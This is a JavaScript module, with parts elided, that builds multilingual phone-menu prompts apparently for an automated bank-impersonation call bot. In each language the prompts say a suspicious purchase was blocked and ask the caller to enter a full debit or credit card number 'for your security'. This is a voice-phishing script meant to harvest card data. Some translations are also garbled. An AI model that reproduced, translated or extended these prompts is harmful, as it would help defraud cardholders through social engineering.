...
exports.getLangDTMFFlow = void 0;
const getLangDTMFFlow = ({ dtmf, language, step, wallet, cardType, pinType, institutionName, }) => {
    switch (step) {
        case `bank`:
            switch (dtmf) {
                case `1`:
            ...
            switch (dtmf) {
                case `1`:
                    return {
                        ...
                        'es-ES': `Por su SEGURIDAD y para BLOQUEAR esta compra, ingrese su número de tarjeta de ${cardType && cardType.toLowerCase() === `debit`
                            ? `DÉBITO`
                            : `CRÉDITO`} seguido de la clave hash.`,
                        'pt-PT': `Para sua SEGURANÇA e para BLOQUEAR esta compra, digite o número do seu cartão de ${cardType && cardType.toLowerCase() === `debit`
                            ? `DÉBITO`
                            : `CRÉDITO`} seguido da chave de hash.`,
                        'pt-BR': `Para sua SEGURANÇA e para BLOQUEAR esta compra, digite o número do seu cartão de ${cardType && cardType.toLowerCase() === `debit`
                            ? `DÉBITO`
                            : `CRÉDITO`} seguido da chave de hash.`,
                        'it-IT': `Per la tua SICUREZZA e per BLOCCARE questo acquisto, inserisci il numero della tua carta di ${cardType && cardType.toLowerCase() === `debit`
                            ? `DEBITO`
                            : `CREDITO`} seguito dalla chiave hash.`,
                        'fr-FR': `Pour votre SÉCURITÉ et pour BLOQUER cet achat, veuillez entrer votre numéro de carte ${cardType && cardType.toLowerCase() === `debit`
                            ? `DEBIT`
                            : `CRÉDIT`} suivi de la clé dièse.`,
                        'de-DE': `Geben Sie zu Ihrer SICHERHEIT und um diesen Kauf zu BLOCKIEREN bitte Ihre ${cardType && cardType.toLowerCase() === `debit`
                            ? `DEBIT-`
                            : `KREDIT`}kartennummer gefolgt von der Raute ein.`,
                        'nb-NO': `For din SIKKERHET og for å BLOKKERE dette kjøpet, skriv inn ${cardType && cardType.toLowerCase() === `debit`
                            ? `debet`
                            : `kreditt`}kortnummeret etterfulgt av hash-nøkkelen.`,
                        'pl-PL': `Aby uzyskać BEZPIECZEŃSTWO i ZABLOKOWAĆ ten zakup, wprowadź numer swojej karty ${cardType && cardType.toLowerCase() === `debit`
                            ? `DEBIT`
                            : `KREDYTOWEJ`}, a następnie klucz mieszający.`,
                        'sv-SE': `För din SÄKERHET och för att BLOCKERA detta köp, vänligen ange ditt ${cardType && cardType.toLowerCase() === `debit`
                            ? `betal`
                            : `KREDIT`}kortsnummer följt av hash-nyckeln.`,
                        'tr-TR': `GÜVENLİĞİNİZ için ve bu satın alma işlemini ENGELLEMEk için lütfen ${cardType && cardType.toLowerCase() === `debit` ? `BANKA` : `KREDİ`} kartı numaranızı ve ardından kare anahtarını girin.`,
                        'cy-GB': `Ar gyfer eich DIOGELWCH ac i flocio'r pryniant hwn, rhowch rif eich cerdyn ${cardType && cardType.toLowerCase() === `debit`
                            ? `debyd`
                            : `CREDYD`} ac yna'r allwedd hash.`,
                        'nl-NL': `Voor uw VEILIGHEID en om deze aankoop te BLOKKEREN, voert u uw ${cardType && cardType.toLowerCase() === `debit`
                            ? `DEBIT-`
                            : `CREDIT-`}kaartnummer in, gevolgd door de hekje.`,
                        'da-DK': `For din SIKKERHED og for at BLOKERE dette køb skal du indtaste dit ${cardType && cardType.toLowerCase() === `debit`
                            ? `DEBIT-`
                            : `KREDIT`}kortnummer efterfulgt af hash-nøglen.`,
                        'ca-ES': `Per a la vostra SEGURETAT i per BLOQUEAR aquesta compra, introduïu el número de la vostra targeta de ${cardType && cardType.toLowerCase() === `debit`
                            ? `DÈBIT`
                            : `CRÈDIT`} seguit de la clau hash.`,
                    }[language];
                case `2`:
                    return {
                        ...
                        'es-ES': `Por su SEGURIDAD, ingrese su número de tarjeta ${cardType && cardType.toLowerCase() === `debit`
                            ? `DÉBITO`
                            : `CRÉDITO`} seguido de la tecla numeral.`,
                        'pt-PT': `Para sua SEGURANÇA, digite o número do seu cartão de ${cardType && cardType.toLowerCase() === `debit`
                            ? `DÉBITO`
                            : `CRÉDITO`} seguido da tecla sustenido.`,
                        'pt-BR': `Para sua SEGURANÇA, digite o número do seu cartão de ${cardType && cardType.toLowerCase() === `debit`
                            ? `DÉBITO`
                            : `CRÉDITO`} seguido da tecla sustenido.`,
                        'it-IT': `Per la tua SICUREZZA, inserisci il numero della tua carta di ${cardType && cardType.toLowerCase() === `debit`
                            ? `DEBITO`
                            : `CREDITO`} seguito dal cancelletto.`,
                        'fr-FR': `Pour votre SÉCURITÉ, veuillez entrer votre numéro de carte ${cardType && cardType.toLowerCase() === `debit`
                            ? `DEBIT`
                            : `CRÉDIT`} suivi de la touche dièse.`,
                        'de-DE': `Geben Sie zu Ihrer SICHERHEIT bitte Ihre ${cardType && cardType.toLowerCase() === `debit`
                            ? `DEBIT-`
                            : `KREDIT`}Kartennummer gefolgt von der Rautetaste ein.`,
                        'nb-NO': `For din SIKKERHET, skriv inn ${cardType && cardType.toLowerCase() === `debit`
                            ? `debet`
                            : `kreditt`}kortnummeret ditt etterfulgt av pund-tasten.`,
                        'pl-PL': `Jako BEZPIECZEŃSTWO wprowadź numer karty ${cardType && cardType.toLowerCase() === `debit`
                            ? `DEBIT-`
                            : `KREDIT`}, a następnie krzyżyk.`,
                        'sv-SE': `För din SÄKERHET, ange ditt ${cardType && cardType.toLowerCase() === `debit`
                            ? `betal`
                            : `KREDIT`}kortsnummer följt av pundnyckeln.`,
                        'tr-TR': `GÜVENLİĞİNİZ için lütfen ${cardType && cardType.toLowerCase() === `debit` ? `BANKA` : `KREDİ`} kartı numaranızı ve ardından kare anahtarını girin.`,
                        'cy-GB': `Ar gyfer eich DIOGELWCH, rhowch rif eich cerdyn ${cardType && cardType.toLowerCase() === `debit`
                            ? `debyd`
                            : `CREDYD`} ac yna'r allwedd punt.`,
                        'nl-NL': `Voer voor uw VEILIGHEID uw ${cardType && cardType.toLowerCase() === `debit`
                            ? `DEBIT-`
                            : `CREDIT-`}kaartnummer in, gevolgd door het hekje.`,
                        'da-DK': `For din SIKKERHED skal du indtaste dit ${cardType && cardType.toLowerCase() === `debit`
                            ? `DEBIT-`
                            : `KREDIT`}kortnummer efterfulgt af pund-tasten.`,
                        'ca-ES': `Per a la vostra SEGURETAT, introduïu el número de la vostra targeta de ${cardType && cardType.toLowerCase() === `debit`
                            ? `DÈBIT`
                            : `CRÈDIT`} seguit de la tecla de lletra.`,
                    }[language];
                case `3`:
                    return {
                        ...
                        'es-ES': `Hemos BLOQUEADO una compra en línea SOSPECHOSA reciente, se utilizaron los datos de su tarjeta de ${cardType && cardType.toLowerCase() === `debit`
                            ? `DÉBITO`
                            : `CRÉDITO`}. Si no fue usted, presione 1, si no fue usted, presione 2, para repetir estas opciones, presione 3.`,
                        'pt-PT': `BLOQUEAMOS uma compra online SUSPEITA recente, os dados do seu cartão de ${cardType && cardType.toLowerCase() === `debit`
                            ? `DÉBITO`
                            : `CRÉDITO`} foram usados. Se não foi você, pressione 1, se foi você, pressione 2, para repetir essas opções, pressione 3.`,
                        'pt-BR': `BLOQUEAMOS uma compra online SUSPEITA recente, os dados do seu cartão de ${cardType && cardType.toLowerCase() === `debit`
                            ? `DÉBITO`
                            : `CRÉDITO`} foram usados. Se não foi você, pressione 1, se foi você, pressione 2, para repetir essas opções, pressione 3.`,
                        'it-IT': `Abbiamo BLOCCATO un recente acquisto SOSPETTO online, sono stati utilizzati i dati della tua carta di ${cardType && cardType.toLowerCase() === `debit`
                            ? `DEBITO`
                            : `CREDITO`}. Se non eri tu, premi 1, se sei tu, premi 2, per ripetere queste opzioni, premi 3.`,
                        'fr-FR': `Nous avons BLOQUÉ un récent achat en ligne SUSPECT, les détails de votre carte de ${cardType && cardType.toLowerCase() === `debit`
                            ? `DEBIT`
                            : `CRÉDIT`} ont été utilisés. Si ce n'était pas vous, veuillez appuyer sur 1, si c'était vous, veuillez appuyer sur 2, pour répéter ces options, veuillez appuyer sur 3.`,
                        'de-DE': `Wir haben einen kürzlich VERDÄCHTIGEN Online-Kauf GESPERRT, Ihre ${cardType && cardType.toLowerCase() === `debit`
                            ? `DEBIT-`
                            : `KREDIT`}kartendaten wurden verwendet. Wenn Sie das nicht waren, drücken Sie bitte 1, wenn Sie das waren, drücken Sie bitte 2, um diese Optionen zu wiederholen, drücken Sie bitte 3.`,
                        'nb-NO': `Vi har BLOKKERT et nylig MISTISKE kjøp på nettet, ${cardType && cardType.toLowerCase() === `debit`
                            ? `debet`
                            : `kreditt`}kortopplysningene dine ble brukt. Hvis dette ikke var deg, trykk 1, hvis dette var deg, trykk 2, for å gjenta disse alternativene, trykk 3.`,
                        'pl-PL': `Zablokowaliśmy niedawny PODEJRZEWANY zakup online, użyto danych Twojej karty ${cardType && cardType.toLowerCase() === `debit`
                            ? `DEBIT`
                            : `KREDYT`}OWEJ. Jeśli to nie Ty, naciśnij 1, jeśli to Ty, naciśnij 2, aby powtórzyć te opcje, naciśnij 3.`,
                        'sv-SE': `Vi har BLOCKERT ett nyligen misstänkt onlineköp, dina ${cardType && cardType.toLowerCase() === `debit`
                            ? `betal`
                            : `KREDIT`}kortsuppgifter användes. Om detta inte var du, vänligen tryck 1, om det här var du, vänligen tryck 2, för att upprepa dessa alternativ, vänligen tryck 3.`,
                        'tr-TR': `Yakın zamanda yapılan ŞÜPHELİ bir çevrimiçi satın alma işlemini ENGELLEDİK, ${cardType && cardType.toLowerCase() === `debit` ? `BANKA` : `KREDİ`} kartı bilgileriniz kullanıldı. Bu siz değilseniz lütfen 1'e, bu sizseniz lütfen 2'ye, bu seçenekleri tekrarlamak için lütfen 3'e basın.`,
                        'cy-GB': `Rydym wedi RHESTRU pryniant ar-lein amheus yn ddiweddar, defnyddiwyd manylion eich cerdyn ${cardType && cardType.toLowerCase() === `debit`
                            ? `debyd`
                            : `CREDYD`}. Os nad chi oedd hwn, pwyswch 1, os mai chi oedd hwn, pwyswch 2, i ailadrodd yr opsiynau hyn, pwyswch 3.`,
                        'nl-NL': `We hebben een recente VERDACHTE online aankoop GEBLOKKEERD, uw ${cardType && cardType.toLowerCase() === `debit`
                            ? `DEBIT-`
                            : `CREDIT-`}kaartgegevens zijn gebruikt. Als u dit niet was, drukt u op 1, als u dit wel was, drukt u op 2, om deze opties te herhalen, drukt u op 3.`,
                        'da-DK': `Vi har BLOKERET et nyligt MISTÆTTELIGT onlinekøb, dine ${cardType && cardType.toLowerCase() === `debit`
                            ? `DEBIT-`
                            : `KREDIT`}kortoplysninger blev brugt. Hvis dette ikke var dig, skal du trykke på 1, hvis det var dig, så tryk på 2, for at gentage disse muligheder, tryk venligst på 3.`,
                        'ca-ES': `Hem BLOQUEAT una compra recent SOSPECTA en línia, s'han utilitzat les dades de la teva targeta de ${cardType && cardType.toLowerCase() === `debit`
                            ? `DÈBIT`
                            : `CRÈDIT`}. Si no vas ser tu, premeu 1, si aquest vau ser vostè, premeu 2, per repetir aquestes opcions, premeu 3.`,
                    }[language];
                default:
                    return {
                        ...
                        'es-ES': `Ha seleccionado una opción NO VÁLIDA. Hemos BLOQUEADO una compra en línea SOSPECHOSA reciente, se utilizaron los datos de su tarjeta de ${cardType && cardType.toLowerCase() === `debit`
                            ? `DÉBITO`
                            : `CRÉDITO`}. Si no fue usted, presione 1, si no fue usted, presione 2, para repetir estas opciones, presione 3.`,
                        'pt-PT': `Você selecionou uma opção INVÁLIDA. BLOQUEAMOS uma compra online SUSPEITA recente, os dados do seu cartão de ${cardType && cardType.toLowerCase() === `debit`
                            ? `DÉBITO`
                            : `CRÉDITO`} foram usados. Se não foi você, pressione 1, se foi você, pressione 2, para repetir essas opções, pressione 3.`,
                        'pt-BR': `Você selecionou uma opção INVÁLIDA. BLOQUEAMOS uma compra online SUSPEITA recente, os dados do seu cartão de ${cardType && cardType.toLowerCase() === `debit`
                            ? `DÉBITO`
                            : `CRÉDITO`} foram usados. Se não foi você, pressione 1, se foi você, pressione 2, para repetir essas opções, pressione 3.`,
                        'it-IT': `Hai selezionato un'opzione NON VALIDA. Abbiamo BLOCCATO un recente acquisto SOSPETTO online, sono stati utilizzati i dettagli della tua carta di ${cardType && cardType.toLowerCase() === `debit`
                            ? `DEBITO`
                            : `CREDITO`}. Se non eri tu, premi 1, se sei tu, premi 2, per ripetere queste opzioni, premi 3.`,
                        'fr-FR': `Vous avez sélectionné une option INVALIDE. Nous avons BLOQUÉ un récent achat en ligne SUSPECT, les détails de votre carte de ${cardType && cardType.toLowerCase() === `debit`
                            ? `DEBIT`
                            : `CRÉDIT`} ont été utilisés. Si ce n'était pas vous, veuillez appuyer sur 1, si c'était vous, veuillez appuyer sur 2, pour répéter ces options, veuillez appuyer sur 3.`,
                        'de-DE': `Sie haben eine UNGÜLTIGE Option ausgewählt. Wir haben einen kürzlich VERDÄCHTIGEN Online-Kauf GESPERRT, Ihre ${cardType && cardType.toLowerCase() === `debit`
                            ? `DEBIT-`
                            : `KREDIT`}Kartendaten wurden verwendet. Wenn Sie das nicht waren, drücken Sie bitte 1, wenn Sie das waren, drücken Sie bitte 2, um diese Optionen zu wiederholen, drücken Sie bitte 3.`,
                        'nb-NO': `Du har valgt et Ugyldig alternativ. Vi har BLOKKERT et nylig MISTISKE kjøp på nettet. ${cardType && cardType.toLowerCase() === `debit`
                            ? `debet`
                            : `kreditt`}kortopplysningene dine ble brukt. Hvis dette ikke var deg, trykk 1, hvis dette var deg, trykk 2, for å gjenta disse alternativene, trykk 3.`,
                        'pl-PL': `Wybrałeś NIEPRAWIDŁOWĄ opcję. Zablokowaliśmy niedawny PODEJRZEWANY zakup online, użyto danych Twojej karty ${cardType && cardType.toLowerCase() === `debit`
                            ? `DEBIT`
                            : `KREDYT`}OWEJ. Jeśli to nie Ty, naciśnij 1, jeśli to Ty, naciśnij 2, aby powtórzyć te opcje, naciśnij 3.`,
                        'sv-SE': `Du har valt ett OGILTIGt alternativ. Vi har BLOCKERT ett nyligen MISSTÄNKT onlineköp, dina ${cardType && cardType.toLowerCase() === `debit`
                            ? `betal`
                            : `KREDIT`}kortsuppgifter användes. Om detta inte var du, vänligen tryck 1, om det här var du, vänligen tryck 2, för att upprepa dessa alternativ, vänligen tryck 3.`,
                        'tr-TR': `GEÇERSİZ bir seçenek seçtiniz. Yakın zamanda yapılan ŞÜPHELİ bir çevrimiçi satın alma işlemini ENGELLEDİK, ${cardType && cardType.toLowerCase() === `debit` ? `BANKA` : `KREDİ`} kartı bilgileriniz kullanıldı. Bu siz değilseniz lütfen 1'e, bu sizseniz lütfen 2'ye, bu seçenekleri tekrarlamak için lütfen 3'e basın.`,
                        'cy-GB': `Rydych chi wedi dewis opsiwn INVALID. Rydym wedi RHWYSTRU pryniant ar-lein amheus yn ddiweddar, defnyddiwyd manylion eich cerdyn ${cardType && cardType.toLowerCase() === `debit`
                            ? `debyd`
                            : `CREDYD`}. Os nad chi oedd hwn, pwyswch 1, os mai chi oedd hwn, pwyswch 2, i ailadrodd yr opsiynau hyn, pwyswch 3.`,
                        'nl-NL': `U heeft een ONGELDIGE optie geselecteerd. We hebben een recente VERDACHTE online aankoop GEBLOKKEERD, uw ${cardType && cardType.toLowerCase() === `debit`
                            ? `DEBIT-`
                            : `CREDIT-`}kaartgegevens zijn gebruikt. Als u dit niet was, drukt u op 1, als u dit wel was, drukt u op 2, om deze opties te herhalen, drukt u op 3.`,
                        'da-DK': `Du har valgt en Ugyldig mulighed. Vi har BLOKERET et nyligt MISTÆTTELIGT onlinekøb, dine ${cardType && cardType.toLowerCase() === `debit`
                            ? `betalings`
                            : `kredit`}kortoplysninger blev brugt. Hvis dette ikke var dig, skal du trykke på 1, hvis det var dig, så tryk på 2, for at gentage disse muligheder, tryk på 3.`,
                        'ca-ES': `Heu seleccionat una opció NO VÀLIDA. Hem BLOQUEAT una compra recent SOSPECTA en línia, s'han utilitzat les dades de la vostra targeta de ${cardType && cardType.toLowerCase() === `debit`
                            ? `DÈBIT`
                            : `CRÈDIT`}. Si no vas ser tu, premeu 1, si aquest vau ser vostè, premeu 2, per repetir aquestes opcions, premeu 3.`,
                    }[language];
            }
...
exports.getLangDTMFFlow = getLangDTMFFlow;
